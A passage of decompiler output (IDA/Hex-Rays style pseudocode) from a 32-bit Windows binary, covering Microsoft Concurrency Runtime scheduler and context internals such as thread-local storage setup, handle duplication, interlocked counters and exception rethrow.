        v11[6] = 1;
      }
      else
      {
        v11 = 0;
      }
      sub_47F282(v5 + 200, v11);
      sub_46F93E(*(_DWORD *)(v5 + 24), v11);
    }
    ++v11[2];
  }
  v12 = this + 3;
  if ( (this[3] & 0xFFFFFFF) != 0 )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    v12 = this + 3;
  }
  result = *(_DWORD *)(v5 + 440);
  if ( *(_DWORD *)(v5 + 436) - result > 0 )
  {
    v14 = *(int (__thiscall **)(int, _DWORD *, int, int, struct _SINGLE_LIST_ENTRY *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)v5 + 56);
    sub_4777A9(v15, v12);
    return v14(v5, this, v15[0], v15[1], v16, v17);
  }
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0048009C) --------------------------------------------------------
int __thiscall sub_48009C(int this, unsigned int a2)
{
  int result; // eax

  result = this + 20;
  if ( !(a2 + _InterlockedExchangeAdd((volatile signed __int32 *)(this + 20), a2)) )
    return sub_4761CF(
             (int (__cdecl **)(int))(this + 28),
             (int (__cdecl *)(int))sub_478753,
             (int (__cdecl *)(int))this,
             *(_DWORD *)this);
  return result;
}

//----- (004800C2) --------------------------------------------------------
_BYTE *__thiscall sub_4800C2(int this, char a2)
{
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // edx
  volatile __int32 *v6; // eax
  volatile __int32 *v7; // edi
  _BYTE *result; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  bool v12; // zf
  bool v13; // al
  int v14; // eax
  volatile __int32 *v15; // eax
  volatile __int32 *v16; // edi
  char v17; // al
  int *v18; // eax
  int v19; // [esp+Ch] [ebp-5Ch]
  _BYTE *v20; // [esp+14h] [ebp-54h] BYREF
  int v21; // [esp+18h] [ebp-50h]
  int v22; // [esp+1Ch] [ebp-4Ch]
  char v23; // [esp+22h] [ebp-46h] BYREF
  char v24; // [esp+23h] [ebp-45h]
  int v25[16]; // [esp+24h] [ebp-44h]

  v3 = 0;
  v24 = 0;
  v19 = *(_DWORD *)(this + 152);
  if ( v19 > 0 )
  {
    v4 = 0;
    v21 = 0;
    v23 = 0;
    v5 = (_DWORD *)(this + 88);
    v22 = 0;
    while ( 1 )
    {
      v6 = (volatile __int32 *)sub_4743F9(v5, v4);
      v7 = v6;
      if ( !v6 )
        goto LABEL_15;
      if ( sub_47FB50(v6) )
        break;
      result = (_BYTE *)sub_480FBD(v7, a2, &v23);
      v20 = result;
      if ( result )
        return result;
      if ( v23 )
        goto LABEL_10;
      v9 = v21;
      if ( v21 >= 15 )
      {
        result = (_BYTE *)sub_480EBA(v7, a2);
        v20 = result;
        if ( result )
          return result;
LABEL_10:
        if ( *((_DWORD *)v7 + 14) != 1 || (v12 = !sub_47FB50(v7), v13 = 1, v12) )
          v13 = 0;
        goto LABEL_14;
      }
      v10 = v22;
      v25[v21] = v22;
      v11 = v9 + 1;
      v21 = v11;
LABEL_16:
      v4 = v10 + 1;
      v5 = (_DWORD *)(this + 88);
      v22 = v4;
      if ( v4 >= v19 )
      {
        if ( v11 > 0 )
        {
          v14 = 0;
          v22 = 0;
          while ( 1 )
          {
            v15 = (volatile __int32 *)sub_4743F9((_DWORD *)(this + 88), v25[v14]);
            v16 = v15;
            if ( v15 )
            {
              if ( !sub_47FB50(v15) )
              {
                result = (_BYTE *)sub_480EBA(v16, a2);
                v20 = result;
                if ( result )
                  return result;
              }
              if ( *((_DWORD *)v16 + 14) != 1 || (v12 = !sub_47FB50(v16), v17 = 1, v12) )
                v17 = 0;
              v24 |= v17;
            }
            v14 = v22 + 1;
            v22 = v14;
            if ( v14 >= v21 )
              goto LABEL_27;
          }
        }
        goto LABEL_27;
      }
    }
    v13 = *((_DWORD *)v7 + 14) == 1;
LABEL_14:
    v24 |= v13;
LABEL_15:
    v10 = v22;
    v11 = v21;
    goto LABEL_16;
  }
LABEL_27:
  if ( sub_47F7C9((volatile signed __int32 *)(this + 52), &v20) )
  {
    sub_481272(v20, 1);
    return v20;
  }
  else
  {
    if ( *(int *)(this + 232) > 0 && v24 && *(int *)(this + 152) > 0 )
    {
      do
      {
        v18 = (int *)sub_4743F9((_DWORD *)(this + 88), v3);
        if ( v18 && v18[14] == 1 && v18[20] <= v18[19] )
          sub_47FECE((union _SLIST_HEADER *)this, v18);
        ++v3;
      }
      while ( v3 < *(_DWORD *)(this + 152) );
    }
    return 0;
  }
}
// 4800C2: using guessed type int var_44[16];

//----- (0048026D) --------------------------------------------------------
_DWORD *__thiscall sub_48026D(int *this, _DWORD *a2, int a3)
{
  int v4; // esi
  unsigned int v5; // ebx
  unsigned int v6; // esi

  sub_473E26(a2, *this);
  v4 = *this;
  v5 = 0;
  v6 = (unsigned int)(v4 + 31) >> 5;
  if ( v6 )
  {
    do
    {
      *(_DWORD *)(a2[1] + 4 * v5) = *(_DWORD *)(this[1] + 4 * v5) & *(_DWORD *)(*(_DWORD *)(a3 + 4) + 4 * v5);
      ++v5;
    }
    while ( v5 < v6 );
  }
  return a2;
}

//----- (004802B9) --------------------------------------------------------
int __thiscall sub_4802B9(void *this, int a2)
{
  return sub_480317((int)this + 296, a2);
}

//----- (004802C8) --------------------------------------------------------
_DWORD *__thiscall sub_4802C8(int this, _DWORD *a2, int a3)
{
  volatile signed __int32 *v4; // ebx
  _DWORD *v5; // esi
  int v6; // edi
  _DWORD *result; // eax
  _DWORD *v8; // [esp+Ch] [ebp-4h]

  v8 = (_DWORD *)(this + 32);
  sub_46FC8F((volatile __int32 *)(this + 32));
  v4 = (volatile signed __int32 *)(this + 28);
  v5 = sub_47FB65((int *)this, *(_DWORD *)(this + 28), 1);
  v6 = *v4 - v5[4];
  *(_DWORD *)(v5[3] + 4 * v6) = a3;
  _InterlockedIncrement(v4);
  *v8 = 0;
  result = a2;
  a2[1] = v6;
  *a2 = v5;
  return result;
}

//----- (00480317) --------------------------------------------------------
int __thiscall sub_480317(int this, int a2)
{
  sub_46FC7F((volatile __int32 *)(this + 8));
  *(_DWORD *)(a2 + 232) = 0;
  **(_DWORD **)(this + 4) = a2;
  *(_DWORD *)(this + 4) = a2 + 232;
  return sub_46FCC0((_DWORD *)(this + 8));
}

//----- (00480355) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_480355(_DWORD *this, int a2)
{
  unsigned int v2; // edi
  unsigned int v3; // esi
  volatile signed __int32 *result; // eax

  v2 = 0;
  v3 = (unsigned int)(*this + 31) >> 5;
  if ( v3 )
  {
    do
    {
      result = (volatile signed __int32 *)(4 * v2 + this[1]);
      _InterlockedOr(result, *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v2++));
    }
    while ( v2 < v3 );
  }
  return result;
}

//----- (0048038D) --------------------------------------------------------
_DWORD *__thiscall sub_48038D(void *this, _DWORD *a2, int a3, int a4, _DWORD *a5)
{
  void *v5; // eax

  v5 = (void *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, a4, 1);
  *a5 = v5;
  sub_4803C5(v5, a2, a3);
  return a2;
}

//----- (004803C5) --------------------------------------------------------
_DWORD *__thiscall sub_4803C5(void *this, _DWORD *a2, int a3)
{
  sub_4802C8((int)this + 52, a2, a3);
  return a2;
}

//----- (004803DD) --------------------------------------------------------
int __thiscall sub_4803DD(int *this)
{
  _DWORD *v2; // edi
  int result; // eax

  v2 = *(_DWORD **)(this[64] + 4);
  sub_480410(v2, this + 7);
  result = this[3] & 0xFFFFFFF;
  if ( result == 3 )
    return sub_48044E(v2, this[9], (signed __int32)this);
  return result;
}

//----- (00480410) --------------------------------------------------------
void __thiscall sub_480410(_DWORD *this, int *a2)
{
  _DWORD *v3; // eax
  void *v4[2]; // [esp+8h] [ebp-8h] BYREF

  if ( sub_476193(a2, (int)(this + 18)) )
  {
    v3 = sub_48026D(a2, v4, (int)(this + 18));
    sub_480355(this + 21, (int)v3);
    j_j_j___free_base(v4[1]);
  }
}

//----- (0048044E) --------------------------------------------------------
signed __int32 __thiscall sub_48044E(_DWORD *this, int a2, signed __int32 a3)
{
  signed __int32 result; // eax

  result = this[23];
  if ( !*(_DWORD *)((a2 << 7) + result) )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), a3, 0);
  return result;
}

//----- (00480474) --------------------------------------------------------
_DWORD *__thiscall sub_480474(int this, int a2, int a3)
{
  bool v3; // zf
  int v5[4]; // [esp+0h] [ebp-10h] BYREF

  v3 = (*(_BYTE *)(this + 48) & 4) == 0;
  memset(v5, 0, sizeof(v5));
  if ( v3 )
    return *(_DWORD **)(this + 56);
  else
    return sub_47F939((char *)this, v5, a3);
}

//----- (004804A3) --------------------------------------------------------
int __thiscall sub_4804A3(int this, int a2, char a3)
{
  int result; // eax
  int v5; // eax
  int v6[4]; // [esp+8h] [ebp-10h] BYREF

  memset(v6, 0, sizeof(v6));
  if ( (*(_BYTE *)(this + 48) & 4) != 0 )
    return sub_47FBAD(this, v6, a3);
  result = *(_DWORD *)(this + 56);
  if ( a3 && !result )
  {
    sub_46FC8F((volatile __int32 *)(this + 8));
    result = *(_DWORD *)(this + 56);
    if ( !result )
    {
      v5 = sub_475884(*(_DWORD **)(this + 4));
      result = sub_47F681((char *)this, v6, v5);
      *(_DWORD *)(this + 56) = result;
    }
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}

//----- (0048050C) --------------------------------------------------------
_DWORD *__thiscall sub_48050C(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  _DWORD *v5; // ecx
  int *v6; // eax
  int v7; // ecx

  sub_47791B(this, a2, 1);
  *this = &Concurrency::details::ExternalContextBase::`vftable';
  this[40] = 0;
  this[41] = 0;
  v4 = sub_46F509(0);
  v5 = (_DWORD *)this[7];
  this[42] = v4;
  this[6] = sub_4754E2(v5);
  v6 = (int *)operator new(0x1Cu);
  if ( v6 )
  {
    v6[2] = 0;
    v6[3] = 0;
    v6[4] = 0;
    v6[5] = 0;
    v6[6] = 1;
  }
  else
  {
    v6 = 0;
  }
  v7 = this[7] + 200;
  this[39] = v6;
  sub_47F282(v7, v6);
  sub_480796((int)this, a3);
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4C1348: using guessed type void *Concurrency::details::ExternalContextBase::`vftable';

//----- (004805A5) --------------------------------------------------------
void __thiscall sub_4805A5(_DWORD *this)
{
  *this = &Concurrency::details::ExternalContextBase::`vftable';
  sub_48067A((int)this);
  sub_477A5E(this);
}
// 4C1348: using guessed type void *Concurrency::details::ExternalContextBase::`vftable';

//----- (004805EA) --------------------------------------------------------
_DWORD *__thiscall sub_4805EA(_DWORD *this, char a2)
{
  sub_4805A5(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0048060F) --------------------------------------------------------
int *__thiscall sub_48060F(_DWORD *this, int a2)
{
  PSLIST_ENTRY v2; // eax

  v2 = sub_4806F7(this);
  if ( v2 )
    return sub_47D4E5(v2, a2);
  else
    return sub_47D5E7(a2);
}

//----- (00480630) --------------------------------------------------------
DWORD __thiscall sub_480630(int this)
{
  int v2; // eax
  DWORD result; // eax
  int v4; // [esp-4h] [ebp-10h]

  v4 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_47890F(3, 4u, v2, v4);
  result = _InterlockedIncrement((volatile signed __int32 *)(this + 44));
  if ( result == 1 )
    return WaitForSingleObjectEx(*(HANDLE *)(this + 168), 0xFFFFFFFF, 0);
  return result;
}

//----- (0048067A) --------------------------------------------------------
int __thiscall sub_48067A(int this)
{
  int result; // eax

  sub_477F70(this);
  if ( *(_DWORD *)(this + 164) )
  {
    CloseHandle(*(HANDLE *)(this + 164));
    *(_DWORD *)(this + 164) = 0;
  }
  if ( *(_DWORD *)(this + 168) )
    CloseHandle(*(HANDLE *)(this + 168));
  if ( *(_DWORD *)(this + 160) )
    sub_476E8F(*(PSLIST_ENTRY *)(this + 160));
  result = *(_DWORD *)(this + 156);
  *(_DWORD *)(this + 156) = 0;
  *(_DWORD *)(result + 24) = 0;
  return result;
}

//----- (004806D2) --------------------------------------------------------
void __thiscall sub_4806D2(_DWORD *this, int a2)
{
  int *v2; // eax

  v2 = (int *)sub_4806F7(this);
  if ( v2 )
    sub_47D55F(v2, a2);
  else
    j_j_j___free_base((void *)(a2 - 4));
}

//----- (004806F7) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_4806F7(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  result = (PSLIST_ENTRY)this[40];
  if ( !result )
  {
    result = sub_475999(1);
    this[40] = result;
  }
  return result;
}

//----- (00480714) --------------------------------------------------------
HMODULE __stdcall sub_480714(int a1, int a2, int a3, int a4)
{
  sub_47500F(*(volatile signed __int32 **)(a2 + 28), (struct _SINGLE_LIST_ENTRY *)a2, 0);
  return sub_46FC4A(a1, a3);
}

//----- (00480736) --------------------------------------------------------
int __stdcall sub_480736(int a1, int a2)
{
  sub_46F980(*(HANDLE *)(a1 + 172));
  return sub_47500F(*(volatile signed __int32 **)(a1 + 28), (struct _SINGLE_LIST_ENTRY *)a1, 0);
}

//----- (00480759) --------------------------------------------------------
bool __thiscall sub_480759(_DWORD *this)
{
  return this[11] == 1;
}

//----- (00480761) --------------------------------------------------------
int __thiscall sub_480761(_DWORD *this, char a2)
{
  int v2; // eax
  int result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  v2 = this[5];
  if ( a2 )
  {
    result = v2 + 1;
  }
  else
  {
    if ( !v2 )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_oversubscribe_operation_Concurrency__);
    }
    result = v2 - 1;
  }
  this[5] = result;
  return result;
}
// 47783D: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);

//----- (00480796) --------------------------------------------------------
DWORD __thiscall sub_480796(int this, char a2)
{
  DWORD result; // eax
  HANDLE *v4; // edi
  HANDLE v5; // eax
  int LastError; // eax
  HANDLE CurrentThread; // [esp-1Ch] [ebp-34h]
  HANDLE CurrentProcess; // [esp-18h] [ebp-30h]
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-10h] BYREF

  *(_BYTE *)(this + 152) = a2;
  result = GetCurrentThreadId();
  *(_DWORD *)(this + 68) = result;
  if ( !a2 )
  {
    v4 = (HANDLE *)(this + 164);
    CurrentProcess = GetCurrentProcess();
    CurrentThread = GetCurrentThread();
    v5 = GetCurrentProcess();
    if ( !DuplicateHandle(v5, CurrentThread, CurrentProcess, (LPHANDLE)(this + 164), 0, 0, 2u) )
    {
      LastError = GetLastError();
      if ( LastError <= 0 )
        goto LABEL_11;
      goto LABEL_10;
    }
    if ( sub_471D09() < 3 )
    {
      result = (DWORD)sub_46F7E4(*v4, (WAITORTIMERCALLBACK)sub_480736, (PVOID)this);
      *(_DWORD *)(this + 172) = result;
    }
    else
    {
      result = sub_46FBDB((int)*v4, (int)sub_480714, this);
      *(_DWORD *)(this + 172) = result;
      if ( !result )
      {
        LastError = GetLastError();
        if ( LastError <= 0 )
          goto LABEL_11;
LABEL_10:
        LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_11:
        sub_4778B7(pExceptionObject, LastError);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
      }
    }
  }
  return result;
}
// 471D09: using guessed type int sub_471D09(void);
// 480796: using guessed type _DWORD pExceptionObject[4];

//----- (00480859) --------------------------------------------------------
int __thiscall sub_480859(int this)
{
  int result; // eax

  sub_478536((int *)this);
  result = *(_DWORD *)(this + 164);
  if ( result )
  {
    result = CloseHandle(*(HANDLE *)(this + 164));
    *(_DWORD *)(this + 164) = 0;
  }
  return result;
}

//----- (0048087B) --------------------------------------------------------
int __thiscall sub_48087B(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
}

//----- (00480893) --------------------------------------------------------
signed __int32 __thiscall sub_480893(int this)
{
  int v2; // eax
  signed __int32 v3; // eax
  signed __int32 result; // eax
  bool v5; // cf
  int v6; // [esp-Ch] [ebp-1Ch]
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( (LPVOID)this == sub_475051() )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVcontext_self_unblock_Concurrency__);
  }
  v6 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_47890F(4, 4u, v2, v6);
  v3 = _InterlockedDecrement((volatile signed __int32 *)(this + 44));
  if ( !v3 )
    return SetEvent(*(HANDLE *)(this + 168));
  v5 = v3 == -1;
  result = v3 + 1;
  if ( !v5 && result != 1 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVcontext_unblock_unbalanced_Concurrency__);
  }
  return result;
}
// 4777DE: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4777EF: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4E545C: using guessed type __TI_flags _TI2_AVcontext_self_unblock_Concurrency__;

//----- (00480914) --------------------------------------------------------
BOOL __thiscall sub_480914(int this)
{
  int v1; // eax
  int v3; // [esp-4h] [ebp-10h]

  v3 = *(_DWORD *)(this + 8);
  v1 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_47890F(5, 4u, v1, v3);
  return SwitchToThread();
}

//----- (00480944) --------------------------------------------------------
_DWORD *__thiscall sub_480944(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  sub_47D620(this, a2);
  *this = &Concurrency::details::ThreadInternalContext::`vftable';
  result = this;
  this[1] = &Concurrency::details::ThreadInternalContext::`vftable';
  return result;
}
// 4C13B4: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';
// 4C13DC: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';

//----- (0048096A) --------------------------------------------------------
HANDLE *__thiscall sub_48096A(HANDLE *this, const void **a2)
{
  HANDLE *result; // eax

  *this = &Concurrency::IScheduler::`vftable';
  sub_473E6C(this + 2, a2);
  *this = &Concurrency::details::ThreadScheduler::`vftable';
  result = this;
  this[2] = &Concurrency::details::ThreadScheduler::`vftable';
  return result;
}
// 4C1394: using guessed type void *Concurrency::IScheduler::`vftable';
// 4C1428: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';
// 4C1448: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';

//----- (0048099B) --------------------------------------------------------
void __thiscall sub_48099B(char *this)
{
  char *v1; // ecx

  *(_DWORD *)this = &Concurrency::details::ThreadScheduler::`vftable';
  v1 = this + 8;
  *(_DWORD *)v1 = &Concurrency::details::ThreadScheduler::`vftable';
  sub_47430A(v1);
}
// 4C1428: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';
// 4C1448: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';

//----- (004809AF) --------------------------------------------------------
_DWORD *__thiscall sub_4809AF(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  *(this - 1) = &Concurrency::details::ThreadInternalContext::`vftable';
  *this = &Concurrency::details::ThreadInternalContext::`vftable';
  sub_47D703(this - 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}
// 4C13B4: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';
// 4C13DC: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';

//----- (004809F1) --------------------------------------------------------
char *__thiscall sub_4809F1(char *this, char a2)
{
  sub_48099B(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00480A16) --------------------------------------------------------
unsigned int __thiscall sub_480A16(void *this, int a2, unsigned int a3)
{
  return sub_474866((int)this + 8, a2, a3);
}

//----- (00480A22) --------------------------------------------------------
HANDLE *__cdecl sub_480A22(const void **a1)
{
  HANDLE *v1; // ecx
  HANDLE *result; // eax

  v1 = (HANDLE *)operator new(0x210u);
  result = 0;
  if ( v1 )
    return sub_48096A(v1, a1);
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00480A55) --------------------------------------------------------
_DWORD *__fastcall sub_480A55(int a1)
{
  _DWORD *v2; // edx
  _DWORD *result; // eax

  v2 = operator new(0xF0u);
  result = 0;
  if ( v2 )
    return sub_480944(v2, a1 != 8 ? a1 : 0);
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00480A93) --------------------------------------------------------
_DWORD *__stdcall sub_480A93(int a1, int a2)
{
  _DWORD *v2; // ecx
  _DWORD *result; // eax

  v2 = operator new(0xE8u);
  result = 0;
  if ( v2 )
    return sub_4833B7(v2, a1, a2);
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00480ACB) --------------------------------------------------------
char *__thiscall sub_480ACB(char *this)
{
  return this - 8;
}

//----- (00480ACF) --------------------------------------------------------
int __thiscall sub_480ACF(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
}

//----- (00480AE8) --------------------------------------------------------
_DWORD *__thiscall sub_480AE8(const void **this, _DWORD *a2)
{
  sub_4758FC(this + 2, a2);
  return a2;
}

//----- (00480AFD) --------------------------------------------------------
_DWORD *__thiscall sub_480AFD(const void **this, _DWORD *a2)
{
  return sub_480AE8(this - 2, a2);
}

//----- (00480B05) --------------------------------------------------------
int __thiscall sub_480B05(_DWORD *this, int a2, unsigned int a3)
{
  return sub_476D4C(this + 2, a2, a3);
}

//----- (00480B11) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_480B11(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4)
{
  return sub_4770FD(this + 1, a2, a3, a4);
}

//----- (00480B1D) --------------------------------------------------------
DWORD sub_480B1D()
{
  DWORD result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsAlloc();
  dwTlsIndex = result;
  if ( result == -1 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 480B1D: using guessed type _DWORD pExceptionObject[4];

//----- (00480B5F) --------------------------------------------------------
BOOL sub_480B5F()
{
  BOOL result; // eax

  result = TlsFree(dwTlsIndex);
  dwTlsIndex = 0;
  return result;
}

//----- (00480BB5) --------------------------------------------------------
void *__cdecl sub_480BB5(void *a1)
{
  __ExceptionPtrCreate(a1);
  __ExceptionPtrCurrentException(a1);
  return a1;
}
// 4AAA42: using guessed type void __cdecl __ExceptionPtrCreate(void *);
// 4AAA51: using guessed type void __cdecl __ExceptionPtrCurrentException(void *);

//----- (00480C01) --------------------------------------------------------
signed __int32 __thiscall sub_480C01(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v2; // esi
  signed __int32 v3; // edx
  signed __int32 v4; // ecx
  signed __int32 result; // eax

  v2 = this + 6;
  v3 = *((_DWORD *)this + 6);
  v4 = v3;
  for ( result = v3; ; v4 = result )
  {
    result = _InterlockedCompareExchange(v2, a2 | v4 & 0xFFFFFFFC, result);
    if ( result == v3 )
      break;
    v3 = result;
  }
  return result;
}

//----- (00480C27) --------------------------------------------------------
int __thiscall sub_480C27(_DWORD *this, unsigned int *a2)
{
  int result; // eax
  unsigned int v3; // ecx

  result = this[2];
  v3 = 0;
  if ( (result & 1) != 0 )
  {
    v3 = result & 0xFFFFFFFE;
    if ( (result & 0xFFFFFFFE) != 0 )
      result = *(_DWORD *)(v3 + 104);
    else
      result = 2;
  }
  if ( a2 )
    *a2 = v3;
  return result;
}

//----- (00480C4F) --------------------------------------------------------
char __thiscall sub_480C4F(volatile signed __int32 *this)
{
  signed __int32 v1; // edx
  signed __int32 v2; // eax

  v1 = *((_DWORD *)this + 6);
  if ( (v1 & 3) != 0 )
    return 0;
  while ( 1 )
  {
    v2 = _InterlockedCompareExchange(this + 6, v1 | 1, v1);
    if ( v2 == v1 )
      break;
    v1 = v2;
    if ( (v2 & 3) != 0 )
      return 0;
  }
  return 1;
}

//----- (00480C77) --------------------------------------------------------
signed __int32 __thiscall sub_480C77(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // edi
  signed __int32 i; // edx
  signed __int32 result; // eax
  signed __int32 v4; // eax
  void *v5; // eax
  unsigned int v6; // esi
  volatile signed __int32 v7; // edx
  volatile signed __int32 v8; // ecx

  v1 = this + 6;
  for ( i = *((_DWORD *)this + 6); ; i = v4 )
  {
    result = i & 0xFFFFFFFC;
    if ( (i & 0xFFFFFFFC) != 0 && result != 12 )
      break;
    v4 = _InterlockedCompareExchange(v1, i & 3 | 8, i);
    if ( v4 == i )
    {
      v5 = operator new(8u);
      v6 = (unsigned int)v5;
      if ( v5 )
        sub_480BB5(v5);
      else
        v6 = 0;
      v7 = *v1;
      v8 = *v1;
      for ( result = *v1; ; LOBYTE(v8) = result )
      {
        result = _InterlockedCompareExchange(v1, v6 | v8 & 3, result);
        if ( result == v7 )
          break;
        v7 = result;
      }
      return result;
    }
  }
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00480CD5) --------------------------------------------------------
void __thiscall sub_480CD5(_DWORD *this)
{
  void *v2; // esi
  int v3; // ecx
  _DWORD v4[6]; // [esp-8h] [ebp-30h] BYREF
  char v5[20]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v2 = (void *)(this[6] & 0xFFFFFFFC);
  if ( v2 && v2 != (void *)12 )
  {
    v6 = 0;
    __ExceptionPtrCopy(v5, v2);
    v6 = 1;
    sub_478D9D(v2, 1);
    this[6] = 0;
    if ( !(unsigned __int8)__uncaught_exception() )
    {
      v4[1] = v3;
      v4[0] = v3;
      std::exception_ptr::exception_ptr((std::exception_ptr *)v4, (const struct std::exception_ptr *)v5);
      std::rethrow_exception();
    }
    v6 = 2;
    __ExceptionPtrDestroy(v5);
  }
}
// 480D32: variable 'v3' is possibly undefined
// 480B73: using guessed type _DWORD __thiscall std::exception_ptr::exception_ptr(std::exception_ptr *__hidden this, const struct std::exception_ptr *);
// 480D4C: using guessed type void __noreturn std::rethrow_exception(void);
// 484EF7: using guessed type int __uncaught_exception(void);
// 4AAA2B: using guessed type void __cdecl __ExceptionPtrCopy(void *, const void *);
// 4AAA7C: using guessed type void __cdecl __ExceptionPtrDestroy(void *);

//----- (00480D65) --------------------------------------------------------
_DWORD *__thiscall sub_480D65(_DWORD *this, int a2)
{
  int v3; // eax
  _DWORD *v4; // ecx
  int v5; // edx

  this[4] = a2;
  *this = 0;
  this[1] = 0;
  this[6] = 0;
  *((_BYTE *)this + 20) = 0;
  this[3] = 0;
  this[2] = 63;
  this[7] = unknown_libname_28(256);
  v3 = unknown_libname_28(512);
  if ( v3 )
  {
    v4 = (_DWORD *)v3;
    v5 = 64;
    do
    {
      *v4 = 0;
      v4 += 2;
      *(v4 - 1) = 0;
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v3 = 0;
  }
  this[8] = v3;
  return this;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (00480DCC) --------------------------------------------------------
_DWORD *__thiscall sub_480DCC(_DWORD *this)
{
  _DWORD *v2; // esi

  v2 = this + 28;
  sub_47C204(this, (int)(this + 28));
  this[14] = 0;
  this[18] = 0;
  sub_480D65(this + 19, (int)v2);
  *v2 = 0;
  this[11] = 0;
  this[13] = this;
  this[16] = Concurrency::details::platform::GetNextAsyncId();
  return this;
}

//----- (00480E16) --------------------------------------------------------
int __thiscall sub_480E16(int this, int a2)
{
  *(_DWORD *)(this + 60) = a2;
  return sub_4761CF(
           (int (__cdecl **)(int))(this + 28),
           sub_480E98,
           (int (__cdecl *)(int))this,
           *(_DWORD *)(*(_DWORD *)(a2 + 256) + 4));
}

//----- (00480E3A) --------------------------------------------------------
int __thiscall sub_480E3A(volatile __int32 *this)
{
  sub_46FC7F(this + 28);
  *((_DWORD *)this + 16) = Concurrency::details::platform::GetNextAsyncId();
  *this = 0;
  *((_DWORD *)this + 1) = 0;
  *((_DWORD *)this + 19) = 0;
  *((_DWORD *)this + 20) = 0;
  *((_DWORD *)this + 25) = 0;
  *((_BYTE *)this + 96) = 0;
  *((_DWORD *)this + 22) = 0;
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 18) = 0;
  return sub_46FCC0((_DWORD *)this + 28);
}

//----- (00480E74) --------------------------------------------------------
int __thiscall sub_480E74(int this, int a2)
{
  *(_DWORD *)(this + 60) = a2;
  return sub_4761CF(
           (int (__cdecl **)(int))(this + 28),
           sub_480EA9,
           (int (__cdecl *)(int))this,
           *(_DWORD *)(*(_DWORD *)(a2 + 256) + 4));
}

//----- (00480E98) --------------------------------------------------------
int __cdecl sub_480E98(int a1)
{
  return sub_47FD15(*(void **)(a1 + 60), a1);
}

//----- (00480EA9) --------------------------------------------------------
signed __int32 __cdecl sub_480EA9(signed __int32 a1)
{
  return sub_47FEA7(*(union _SLIST_HEADER **)(a1 + 60), a1);
}

//----- (00480EBA) --------------------------------------------------------
